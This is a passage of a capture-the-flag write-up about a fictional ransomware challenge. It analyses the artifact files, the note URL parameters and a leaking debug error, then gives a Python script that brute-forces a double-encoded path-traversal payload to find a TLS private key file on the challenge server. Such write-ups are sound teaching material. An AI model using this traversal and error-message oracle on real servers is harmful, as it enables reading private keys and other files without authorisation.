## Solution

When accessing the machine, I was greeted with an interface that allowed me to generate and download artifacts.

![](images/North%20Pole%20Cyber%20Security%20Department.png)

After downloading and extracting the `frostbitartifacts.zip` file, I found the following files within the archive. To gain a better understanding of their nature, I used the `file` command to analyze them, yielding the following insights:

1. `DoNotAlterOrDeleteMe.frostbit.json`
    - File type: JSON text data
    - Initial thoughts: This file might contain metadata or configuration data crucial to the environment.

2. `frostbit.elf`
    - File type: ELF 64-bit LSB executable, x86-64
    - Details: Dynamically linked with debug information and not stripped. It has a Go BuildID and specifies /lib64/ld-linux-x86-64.so.2 as its interpreter.
    - Initial thoughts: Likely the core binary of interest, potentially requiring reverse engineering or dynamic analysis.

3. `frostbit_core_dump.14`
    - File type: ELF 64-bit LSB core file, x86-64
    - Details: Includes a bad note name size value.
    - Initial thoughts: This core dump might provide insights into the state of the frostbit.elf process at the time of the dump.

4. `naughty_nice_list.csv.frostbit`
    - File type: Data (unidentified format)
    - Initial thoughts: The flag / name of the child must be in this encrypted file.

5. `ransomware_traffic.pcap`
    - File type: PCAP capture file (Ethernet, little-endian)
    - Initial thoughts: Contains network traffic, potentially revealing malicious communication or patterns related to ransomware activity.

#### Observations on the URL Structure
The ransomware note URL contains multiple components that correspond to parameters found in the artifacts, particularly `DoNotAlterOrDeleteMe.frostbit.json` and earlier API interactions. Key findings include:

1. `digest` (`b980d39e2ec4c8490503701202000148`):
    - This matches an entry in the JSON file and seems crucial for validating requests.

2. `statusID` (`Y8hoOhj8Oko`):
    - This aligns with identifiers related to specific ransomware note pages.

3. `botUUID` (`24157fd8-2bc9-4efc-ba3b-720fb47bbb00`):
    - References to this UUID appear throughout the debug data and API responses. It is likely a unique identifier assigned to the victim's network or device.

Based on these observations and correlations, the ransomware URL structure can be generalized as:

`https://api.frostbit.app/view/<statusID>/<botUUID>/status?digest=<digest>`

The botUUID appears to uniquely identify the targeted victim or environment, possibly functioning as an encrypted identifier.

After some time while experimenting with the digest parameter, I accidentally appended extra random characters to its value while keeping `&debug=true` enabled. This action unexpectedly triggered an error response that provided valuable insights:

```json
{
    "debug": true,
    "error": "Status Id File Digest Validation Error: Traceback (most recent call last):\n  File \"/app/frostbit/ransomware/static/FrostBiteHashlib.py\", line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n"
}
```

The error revealed the existence of a file named [FrostBiteHashlib.py](files/FrostBiteHashlib.py) located at `/app/frostbit/ransomware/static/FrostBiteHashlib.py`.

Upon reviewing the `FrostBiteHashlib.py` file, I focused on the `_compute_hash` function. This function appears to generate a hash by iterating over the file's contents and its filename. The key operations involve:
 - Each byte of the file contents and the filename is XORed with a `nonce`.
 - A bitwise AND operation is applied between the result of the XOR and the `nonce`.

This hashing mechanism ties the file's integrity to both its contents and its filename, using the `nonce` as a key component.

Determining the correct path to the key file proved to be a significant challenge. After extensive testing, I made the following observations:
- Setting the digest to a value of all zeros (`00000000000000000000000000000000`) allowed the server to reveal more information about the file's location.
- If the path or `digest` was incorrect, the server typically returned an error like `{"error":"Invalid Request"}`. However, if a valid file was found but its hash didn't match, the server responded with: `{"error":"Invalid Status Id or Digest"}`.

I leveraged the server's behavior in a brute-force script to systematically test possible relative paths. By observing the responses, I pinpointed the correct path to the key file.

It's worth noting that the `etc/nginx/certs/api.frostbit.app.key` file path was actually hinted at in a previous challenge.

```python
import requests

url_base : str = "https://api.frostbit.app/view/"
url_path : str = "/24157fd8-2bc9-4efc-ba3b-720fb47bbb00/status?debug=true&digest=00000000000000000000000000000000"
file_name : str = "etc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key"

payload : str = ""

try:
    while True:
        payload += "..%252F"
        url : str = f"{url_base}{payload}{file_name}{url_path}"

        response = requests.get(url)
        response_data = response.json()

        if response_data.get("error") == "Invalid Status Id or Digest":
            print(response_data)
            print(url)
            print("-----")
except KeyboardInterrupt:
    exit
```
